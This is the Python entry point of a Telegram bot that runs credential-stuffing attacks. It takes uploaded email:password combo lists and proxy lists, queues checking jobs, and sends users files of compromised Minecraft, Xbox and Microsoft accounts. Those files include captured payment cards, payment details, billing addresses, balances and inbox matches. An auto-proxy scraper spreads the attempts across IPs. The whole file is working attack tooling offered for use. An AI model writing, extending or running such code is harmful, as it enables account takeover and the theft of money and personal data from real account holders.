"""
main.py — Bot entry point, queue/worker system, result delivery.
"""
import os
import asyncio
import threading

from aiogram import types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import Database
from checker_engine import CheckerEngine
from bot_interface import dp, bot, ADMIN_ID, get_main_keyboard
import auto_proxy as auto_proxy_mod

db = Database()
queue = asyncio.Queue()
running_checks = 0
queue_lock = asyncio.Lock()
temp_combos = {}       # user_id -> combo list
waiting_for_threads = set()

# Shared auto-proxy pool (populated by background thread if enabled)
_auto_proxy_pool = []
_auto_proxy_stop = threading.Event()
_auto_proxy_thread = None


class CheckTask:
    def __init__(self, user_id, combo_data, proxy_data, message):
        self.user_id = user_id
        self.combo_data = combo_data
        self.proxy_data = proxy_data
        self.message = message


async def worker():
    global running_checks
    while True:
        task = await queue.get()
        async with queue_lock:
            running_checks += 1
        try:
            await run_checker(task)
        except Exception as e:
            print(f'[Worker error] {e}')
        finally:
            async with queue_lock:
                running_checks -= 1
            queue.task_done()


async def run_checker(task: CheckTask):
    user = db.get_user(task.user_id)
    is_admin = user[3] == 'admin'
    settings = db.get_settings(task.user_id)
    max_threads = 20 if is_admin else 10
    threads = min(settings.threads, max_threads)

    loop = asyncio.get_event_loop()
    engine = CheckerEngine(
        task.user_id,
        task.combo_data.copy(),
        task.proxy_data,
        threads,
        settings,
        db,
        bot,
        loop,
        auto_proxy_pool=_auto_proxy_pool if _auto_proxy_pool else None,
    )

    ui_task = asyncio.create_task(engine.update_ui(task.message))
    await loop.run_in_executor(None, engine.start)
    engine.is_running = False
    await ui_task

    import time as _time
    elapsed = _time.time() - engine.start_time
    cpm = int((engine.checked / elapsed) * 60) if elapsed > 0 else 0
    hit_rate = (engine.hits / engine.checked * 100) if engine.checked > 0 else 0
    e_fmt = engine._fmt_time(elapsed)
    final_text = (
        f'🏁 <b>Check Completed!</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        f'<b>Results:</b>\n'
        f'  ┌ 🎯 Hits: <code>{engine.hits}</code>\n'
        f'  ├ ❌ Bad: <code>{engine.bad}</code>\n'
        f'  ├ 🔐 2FA: <code>{engine.twofa}</code>\n'
        f'  ├ 📧 Valid Mail: <code>{engine.valid_mail}</code>\n'
        f'  ├ ⚠️ Errors: <code>{engine.errors}</code>\n'
        f'  └ 🔄 Total: <code>{engine.total}</code>\n\n'
        f'<b>Performance:</b>\n'
        f'  ├ 📈 Hit Rate: <code>{hit_rate:.2f}%</code>\n'
        f'  ├ ⚡ Avg CPM: <code>{cpm:,}</code>\n'
        f'  └ ⏱ Duration: <code>{e_fmt}</code>\n\n'
        f'<i>Credits: @akaza_isnt</i>'
    )
    try:
        await task.message.edit_text(final_text, parse_mode='HTML')
    except Exception:
        pass

    # Deliver result files
    config = db.get_user_capture_config(task.user_id)
    result_type = config.get('result_type', 'all')
    file_format = config.get('file_format', 'txt')

    if file_format == 'zip':
        try:
            zip_path = engine.get_results_zip()
            if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                await bot.send_document(
                    task.user_id,
                    types.FSInputFile(zip_path),
                    caption='📦 Your results (ZIP)\n\nCredits: @akaza_isnt'
                )
            else:
                await bot.send_message(
                    task.user_id,
                    '⚠️ No results were found for your check run.\n\nCredits: @akaza_isnt'
                )
        except Exception as e:
            print(f'[ZIP delivery error] user={task.user_id} error={e}')
            await bot.send_message(
                task.user_id,
                '❌ An error occurred while creating your results ZIP. Please try again.\n\nCredits: @akaza_isnt'
            )
    else:
        # Send individual files
        if result_type == 'hits':
            _files_to_send = ['hits.txt', 'Capture.txt']
        else:
            # All non-empty txt files
            _files_to_send = []
            for root, dirs, files in os.walk(engine.results_dir):
                for fname in files:
                    if fname.endswith('.txt'):
                        _files_to_send.append(os.path.relpath(os.path.join(root, fname), engine.results_dir))

        for rel_path in _files_to_send:
            full_path = os.path.join(engine.results_dir, rel_path)
            if os.path.exists(full_path) and os.path.getsize(full_path) > 0:
                caption_map = {
                    'hits.txt': '✅ Hits',
                    'bad.txt': '❌ Bad accounts',
                    '2fa.txt': '🔐 2FA accounts',
                    'Valid_Mail.txt': '📧 Valid mail',
                    'Normal.txt': '🎮 Normal Minecraft',
                    'XboxGamePass.txt': '🎮 Xbox Game Pass',
                    'XboxGamePassUltimate.txt': '🎮 Xbox Game Pass Ultimate',
                    'Other.txt': '📦 Other accounts',
                    'Banned.txt': '🚫 Banned accounts',
                    'Unbanned.txt': '✅ Unbanned accounts',
                    'MFA.txt': '🔓 MFA accounts',
                    'SFA.txt': '🔒 SFA accounts',
                    'Codes.txt': '🎁 Buddy pass codes',
                    'Cards.txt': '💳 Payment cards',
                    'Payment.txt': '💰 Payment details',
                    'Microsoft_Balance.txt': '💵 MS Balance',
                    'Ms_Points.txt': '⭐ Rewards points',
                    'Subscriptions.txt': '📋 Subscriptions',
                    'Billing_Addresses.txt': '🏠 Billing addresses',
                    'donut_stats.txt': '🍩 DonutSMP stats',
                    'inboxes.txt': '📬 Inbox matches',
                    'Capture.txt': '📄 Full capture',
                    'errors.txt': '⚠️ Errors',
                }
                caption = caption_map.get(os.path.basename(rel_path), f'📄 {os.path.basename(rel_path)}')
                try:
                    await bot.send_document(
                        task.user_id,
                        types.FSInputFile(full_path),
                        caption=f'{caption}\n\nCredits: @akaza_isnt'
                    )
                except Exception:
                    pass


@dp.message(F.document)
async def handle_document(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)

    if not user or user[3] not in ('authorized', 'admin'):
        await message.reply('🚫 You are not authorized to use the checker.')
        return

    file_name = message.document.file_name.lower()

    if 'proxy' in file_name or (message.caption and 'proxy' in message.caption.lower()):
        if user_id not in temp_combos:
            await message.reply('⚠️ Please upload combos first.')
            return
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore').splitlines()
        proxies = [p.strip() for p in content if p.strip()]
        combos = temp_combos.pop(user_id)
        await add_to_queue(user_id, combos, proxies, message)
    else:
        if not file_name.endswith('.txt'):
            await message.reply('⚠️ Please upload a .txt file containing combos (email:pass).')
            return
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore').splitlines()
        combos = [c.strip() for c in content if ':' in c]
        if not combos:
            await message.reply('⚠️ No valid combos found in the file.')
            return
        temp_combos[user_id] = combos
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="🚫 No Proxy", callback_data="noproxy_btn"))
        await message.reply(
            f'📋 <b>Combos Loaded</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
            f'  ├ 📄 File: <code>{message.document.file_name}</code>\n'
            f'  └ 🔢 Valid combos: <code>{len(combos):,}</code>\n\n'
            f'Now send a <b>proxy file</b> (.txt) or tap\n'
            f'the button below to check without proxies.',
            parse_mode='HTML',
            reply_markup=builder.as_markup()
        )


@dp.message(Command('noproxy'))
async def no_proxy(message: types.Message):
    user_id = message.from_user.id
    if user_id not in temp_combos:
        await message.reply('⚠️ Please upload combos first.')
        return
    combos = temp_combos.pop(user_id)
    await add_to_queue(user_id, combos, [], message)

@dp.callback_query(F.data == "noproxy_btn")
async def noproxy_btn(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_combos:
        await callback.answer("⚠️ No combos loaded. Upload a combo file first.", show_alert=True)
        return
    combos = temp_combos.pop(user_id)
    await add_to_queue(user_id, combos, [], callback.message)


async def add_to_queue(user_id, combos, proxies, message):
    pos = queue.qsize() + 1
    proxy_status = f'<code>{len(proxies):,}</code> loaded' if proxies else '<i>No proxies (direct)</i>'
    status_msg = await message.reply(
        f'⌛ <b>Queued for Checking</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        f'  ├ 📋 Combos: <code>{len(combos):,}</code>\n'
        f'  ├ 🌐 Proxies: {proxy_status}\n'
        f'  └ 📍 Queue Position: <code>#{pos}</code>\n\n'
        f'<i>Starting shortly...</i>',
        parse_mode='HTML'
    )
    task = CheckTask(user_id, combos, proxies, status_msg)
    await queue.put(task)


def _start_auto_proxy_if_needed():
    """Start auto-proxy scraper thread if any user has it enabled."""
    global _auto_proxy_thread
    users = db.get_all_users()
    for u in users:
        s = db.get_settings(u[0])
        if s and s.auto_proxy:
            config = db.get_user_capture_config(u[0])
            _auto_proxy_thread = auto_proxy_mod.start_auto_proxy_thread(
                _auto_proxy_pool, config, _auto_proxy_stop
            )
            print('[Auto-Proxy] Scraper thread started.')
            break


async def main():
    max_concurrent = int(db.get_bot_config('max_concurrent', '3'))

    # Start auto-proxy thread if needed
    _start_auto_proxy_if_needed()

    # Start worker coroutines
    for _ in range(max_concurrent):
        asyncio.create_task(worker())

    print('[Bot] Starting polling...')
    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
